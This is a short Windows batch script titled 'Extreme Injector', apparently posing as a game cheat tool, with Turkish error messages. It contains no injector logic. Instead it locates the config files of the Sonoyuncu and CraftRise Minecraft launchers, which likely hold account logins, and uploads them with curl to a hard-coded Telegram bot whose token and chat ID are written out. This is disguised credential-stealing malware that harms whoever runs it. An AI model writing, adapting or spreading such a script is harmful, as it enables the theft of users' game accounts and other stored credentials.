@echo off
setlocal enabledelayedexpansion
title Extreme Injector

:: Telegram Settings
set BOT_TOKEN=7800902685:AAEDOHPRbKLa38sRa3oqzzwXLzFazKzyjuQ
set CHAT_ID=6225508496

:: File Paths
set SONOYUNCU_FILE=%appdata%\.sonoyuncu\config.json
set CRAFTRISE_FILE=%appdata%\.craftrise\config.json

:: Send Sonoyuncu Config if it exists
if exist "%SONOYUNCU_FILE%" (
    curl -s -F "chat_id=%CHAT_ID%" -F "caption=Sonoyuncu Config" -F "document=@%SONOYUNCU_FILE%" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" > "%temp%\curl_sonoyuncu.out"
    set /p CURL_OUTPUT=<"%temp%\curl_sonoyuncu.out"
    if not !errorlevel! equ 0 (
        echo HATA: Curl ciktisi: !CURL_OUTPUT!
    )
)

:: Send Craftrise Config if it exists
if exist "%CRAFTRISE_FILE%" (
    curl -s -F "chat_id=%CHAT_ID%" -F "caption=Craftrise Config" -F "document=@%CRAFTRISE_FILE%" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" > "%temp%\curl_craftrise.out"
    set /p CURL_OUTPUT=<"%temp%\curl_craftrise.out"
    if not !errorlevel! equ 0 (
        echo HATA: Curl ciktisi: !CURL_OUTPUT!
    )
)

endlocal
exit /b 0